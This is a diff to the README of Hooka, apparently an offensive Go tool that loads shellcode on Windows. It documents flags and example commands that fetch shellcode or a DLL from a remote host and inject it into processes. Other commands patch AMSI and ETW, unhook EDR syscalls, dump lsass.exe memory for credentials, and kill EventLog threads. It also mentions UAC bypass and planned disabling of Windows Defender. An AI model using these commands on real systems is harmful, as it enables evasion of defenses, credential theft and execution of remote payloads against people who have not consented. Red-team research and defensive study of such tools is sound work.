@@ -26,25 +26,43 @@ However I've also taken some code from [BananaPhone](https://github.com/C-Sto/Ba
 - Get shellcode from remote URL or local file
 - Shellcode reflective DLL injection (***sRDI***)
 - ***AMSI*** and ***ETW*** patch
+- ***Phant0m*** technique to kill EventLog threads (see [here](https://github.com/hlldz/Phant0m))
 - Detects hooked functions (i.e. NtCreateThread)
 - Compatible with base64 and hex encoded shellcode
 - Hell's Gate + Halo's Gate technique
-- Capable of unhooking functions via multiple techniques:
+- Capable of unhooking user-mode syscalls via multiple techniques:
   - Classic unhooking
   - Full DLL unhooking
   - Perun's Fart technique
 
 - Multiple shellcode injection techniques:
   - CreateRemoteThread
-  - Fibers
   - CreateProcess
-  - EarlyBirdAPC
+  - EnumSystemLocales
+  - Fibers
+  - QueueUserApc
   - UuidFromString
+  - EtwpCreateEtwThread
+  - RtlCreateUserThread
 
 - Inject shellcode into a process (not stable and only works via CreateRemoteThread technique)
 - Dump lsass.exe process to a file
 - Windows API hashing (see [here](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware))
-- Test mode (injects a calc.exe shellcode)
+- Test mode (injects calc.exe shellcode)
+
+- All already mentioned features available through official package API
+
+***This repo is under development so it may contain errors, use it under you rown responsability for legal testing purposes***
+
+# Installation
+
+- Just clone the repository like this:
+
+```sh
+git clone https://github.com/D3Ext/Hooka
+cd Hooka
+GOARCH=amd64 GOOS=windows go build .
+```
 
 # Usage
 
@@ -60,13 +78,7 @@ NtdllDialogWndProc_W
 ZwQuerySystemTime
 ```
 
-- Just clone the repository like this:
-
-```sh
-git clone https://github.com/D3Ext/Hooka
-cd Hooka
-go build .
-```
+- Let's see some examples
 
 > Help panel
 ```
@@ -87,26 +99,36 @@ go build .
         overwrite EtwEventWrite memory address to patch ETW (Event Tracing for Windows)
   -file string
         path to file where shellcode is stored
-  -halos
-        use Hell's Gate and Halo's Gate to resolve syscalls (not all injection techniques are covered)
   -hex
         decode hex encoded shellcode
   -hooks
         dinamically detect hooked functions by EDR
   -lsass string
-        dump lsass.exe process memory into a file to extract credentials (run as admin)
+        dump lsass.exe process memory into a file to extract credentials (run with high privs)
+  -phantom
+        use Phant0m technique to suspend EventLog threads (run with high privs)
   -pid int
-        PID to inject shellcode into (default: self)
+        PID to inject shellcode into (only applies for certain techniques) (default: self)
   -remote-dll string
         remote url where DLL is stored, especify function separated by comma (i.e. http://192.168.1.37/evil.dll,xyz)
   -t string
-        shellcode injection technique: CreateRemoteThread, Fibers, CreateProcess, EarlyBirdApc, UuidFromString (default: random)
+        shellcode injection technique (default: 1):
+          1: CreateRemoteThread
+          2: CreateRemoteThreadHalos
+          3: CreateProcess
+          4: EnumSystemLocales
+          5: EnumSystemLocalesHalos
+          6: Fibers
+          7: QueueUserApc
+          8: UuidFromString
+          9: EtwpCreateEtwThread
+          10: RtlCreateUserThread
   -test
         test shellcode injection capabilities by spawning a calc.exe
   -unhook int
         overwrite syscall memory address to bypass EDR : 1=classic, 2=full, 3=Perun's Fart
   -url string
-        remote shellcode url (e.g. http://192.168.1.37/shellcode.bin)
+        remote url where shellcode is stored (e.g. http://192.168.1.37/shellcode.bin)
 ```
 
 > Detect hooked functions by EDR (including false positives)
@@ -118,8 +140,6 @@ go build .
 ```sh
 .\Hooka.exe --test
 ```
-
-- If no technique is especified it will use a random one
 
 > Inject shellcode from URL or file
 ```sh
@@ -133,7 +153,7 @@ go build .
 .\Hooka.exe --remote-dll http://192.168.1.37/evil.dll,xyz
 ```
 
-> Inject shellcode into remote process (i.e. svchost.exe) **Not all techniques covered!!**
+> Inject shellcode into remote process (i.e. werfault.exe) **Not all techniques covered!!**
 ```sh
 .\Hooka.exe --url http://192.168.116.37/shellcode.bin --pid 5864
 ```
@@ -146,7 +166,7 @@ go build .
 
 > Use Hell's Gate + Halo's Gate to bypass AVs/EDRs
 ```sh
-.\Hooka.exe --url http://192.168.116.37/shellcode.bin --hells -t CreateRemoteThread
+.\Hooka.exe -t CreateRemoteThreadHalos --url http://192.168.116.37/shellcode.bin
 ```
 
 > Unhook function before injecting shellcode
@@ -156,8 +176,18 @@ go build .
 
 > Patch AMSI and/or ETW
 ```sh
-.\Hooka.exe --url http://192.168.116.37/shellcode.bin --amsi
-.\Hooka.exe --url http://192.168.116.37/shellcode.bin --etw
+.\Hooka.exe --amsi --url http://192.168.116.37/shellcode.bin
+.\Hooka.exe --etw --url http://192.168.116.37/shellcode.bin
+```
+
+> Kill EventLog service threads (run as admin)
+```sh
+.\Hooka.exe --phantom
+```
+
+> Dump lsass.exe memory to extract credentials (run as admin)
+```sh
+.\Hooka.exe --lsass dump.tmp
 ```
 
 As you can see Hooka provides a lot of CLI flags to help you in all kind of situations
@@ -181,15 +211,17 @@ As you can see Hooka provides a lot of CLI flags to help you in all kind of situ
 
 # TODO
 
-:black_square_button: Stable API for CLR functions
-
-:black_square_button: More injection techniques
+:ballot_box_with_check: More injection techniques
 
 :black_square_button: `--pid` flag to handle process injection
 
 :ballot_box_with_check: Sandboxing functions
 
-:black_square_button: Native golang [Phant0m](https://github.com/hlldz/Phant0m) to suspend EventLog threads
+:ballot_box_with_check: Native golang [Phant0m](https://github.com/hlldz/Phant0m) to suspend EventLog threads
+
+:black_square_button: Function to find PIDs which haven't loaded a given DLL (i.e. umppc16606.dll)
+
+:black_square_button: Remove Windows Defender privileges to make it useless (see [here](https://github.com/plackyhacker/SandboxDefender))
 
 :black_square_button: Test unhooking functions against EDRs
 
@@ -203,11 +235,9 @@ Do you wanna improve the code with any idea or code optimization? You're in the 
 
 See [CONTRIBUTING.md](https://github.com/D3Ext/Hooka/blob/main/CONTRIBUTING.md)
 
-# Known issues
-
-The UAC bypass is not used in the main Hooka loader but you can call the functions using the `pkg/hooka` package. To avoid being detected by AVs, the `ExecUac` function receives a path to execute as administrator (i.e. C:\Windows\System32\cmd.exe) and then it copies the binary to the TEMP folder with a random name. So keep in mind that if you abuse this feature you may notice that you have some .exe files in that dir because the file can't be removed while it is running. However I've created another function called `RemoveUacFiles()` which removes all these files, just ensure that you use it when UAC bypass isn't executing that binary.
-
 # References
+
+You can take a look at some of the mentioned techniques here:
 
 ```
 https://github.com/C-Sto/BananaPhone
